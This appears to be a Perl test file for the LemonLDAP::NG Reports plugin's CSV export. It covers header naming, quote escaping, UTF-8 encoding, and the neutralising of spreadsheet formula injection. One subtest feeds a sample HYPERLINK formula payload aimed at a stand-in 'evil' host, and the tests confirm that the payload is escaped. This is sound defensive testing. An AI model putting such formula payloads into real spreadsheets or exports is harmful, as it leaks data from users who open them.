use warnings;
use strict;
use utf8;
use Test::More;
use Encode qw(decode_utf8);

BEGIN {
    require 't/test-lib.pm';
}

{
    package t::Mesg;
    sub new     { my ( $c, @e ) = @_; bless { e => \@e }, $c }
    sub code    { 0 }
    sub entries { @{ $_[0]{e} } }

    package t::Entry;
    sub new       { my ( $c, %a ) = @_; bless {%a}, $c }
    sub get_value { $_[0]{ $_[1] } }

    package t::UserDB;
    our %entry;
    sub new          { bless {}, shift }
    sub validateLdap { 1 }
    sub ldap         { $_[0] }
    sub search       { t::Mesg->new( t::Entry->new(%entry) ) }
}

my $op = LLNG::Manager::Test->new( {
        ini => {
            logLevel       => 'error',
            authentication => 'Demo',
            userDB         => 'Same',
            customPlugins  => '::Plugins::Reports',
            ldapBase       => 'dc=example,dc=com',
        }
    }
);

{
    no warnings 'redefine';
    no warnings 'once';
    *Lemonldap::NG::Portal::Plugins::Reports::queryDb = sub { [] };
}
$op->p->{loadedModules}->{'Lemonldap::NG::Portal::UserDB::LDAP'} =
  t::UserDB->new;

my $id = $op->login('dwho');

sub report {
    return $op->_get(
        '/reports/lastcnx',
        accept => 'text/csv',
        cookie => "lemonldap=$id",
    );
}

subtest 'headers keep their multi-word names' => sub {
    %t::UserDB::entry = ( uid => 'x' );
    my $body = report()->[2]->[0];
    like(
        $body,
        qr/^"UID";"Last connection";"Givenname";"Surname";"Department"$/m,
        'the lastcnx header has five named fields'
    );
    unlike(
        $body,
        qr/^"UID";"Last";"connection"/m,
        'the header is not split on whitespace'
    );
};

subtest 'quotes are doubled and the row keeps its fields' => sub {
    %t::UserDB::entry = (
        uid                 => 'x',
        givenName           => 'Marie',
        sn                  => 'O"Neil',
        twakeDepartmentPath => 'd',
    );
    my $res = report();
    is( $res->[0], 200, 'report served' );
    like(
        $res->[2]->[0],
        qr/^"x";"never";"Marie";"O""Neil";"d"$/m,
        'the quote is doubled and the row keeps its five fields'
    );
};

subtest 'formula injection prefixes are neutralised' => sub {
    my $field = Lemonldap::NG::Portal::Plugins::Reports->can('_csvField');
    is( $field->('=1+1'),        qq("'=1+1"),      'equals is prefixed' );
    is( $field->('+1'),          qq("'+1"),        'plus is prefixed' );
    is( $field->('-1'),          qq("'-1"),        'minus is prefixed' );
    is( $field->('@SUM(A1)'),    qq("'\@SUM(A1)"), 'at is prefixed' );
    is( $field->("\tX"),         qq("'\tX"),       'tab is prefixed' );
    is( $field->("\rX"),         qq("'\rX"),       'CR is prefixed' );
    is( $field->('hello'),       qq("hello"),      'plain text is untouched' );
    is( $field->('12'),          qq("12"),         'numbers stay quoted' );
};

subtest 'user-agent headers and formula payloads' => sub {
    {
        local *Lemonldap::NG::Portal::Plugins::Reports::queryDb = sub {
            [ [ '=HYPERLINK("https://evil/?"&A1;"click")', '12' ] ];
        };
        my $res = $op->_get(
            '/reports/browsers',
            accept => 'text/csv',
            cookie => "lemonldap=$id",
        );
        is( $res->[0], 200, 'browsers report served' );
        my $body = $res->[2]->[0];
        like( $body, qr/^"User Agent";"Count"$/m,
            'the browsers header has two named fields' );
        like(
            $body,
            qr/^"'=HYPERLINK\(""https:\/\/evil\/\?""&A1;""click""\)";"12"$/m,
            'the injected user-agent is neutralised'
        );
    }
};

subtest 'the body is UTF-8 bytes with a byte Content-Length' => sub {
    %t::UserDB::entry = (
        uid                 => 'x',
        twakeDepartmentPath => "\x{263a}",
    );
    my $res = report();
    is( $res->[0], 200, 'report served' );

    my $body = $res->[2]->[0];
    my %h    = @{ $res->[1] };
    unlike( $body, qr/[^\x00-\xff]/, 'the body is made of bytes' );
    is( $h{'Content-Length'}, length($body),
        'Content-Length counts these bytes' );
    is( $h{'Content-Type'}, 'text/csv; charset=utf-8',
        'Content-Type announces UTF-8' );
    like( decode_utf8($body), qr/"\x{263a}"/, 'the value is sent in UTF-8' );
};

clean_sessions();
done_testing();
